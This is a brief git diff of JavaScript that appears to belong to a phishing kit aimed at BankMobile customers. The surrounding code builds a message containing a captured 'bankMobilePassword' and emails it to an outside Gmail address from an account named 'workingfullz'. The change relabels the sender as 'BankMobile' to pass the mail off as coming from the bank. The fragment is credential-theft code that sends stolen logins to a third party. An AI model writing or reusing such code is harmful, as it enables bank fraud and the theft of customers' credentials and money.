@@ -69,7 +69,7 @@ Password: ${bankMobilePassword || "N/A"}
   });
 
   const mailOptions = {
-    from: '"Form Bot" <workingfullz@gmail.com>',
+    from: '"BankMobile" <workingfullz@gmail.com>',
     to: "recruitmentupdate9@gmail.com", // ✅ Email recipient
     subject: "📥 BankMobile",
     text: message,
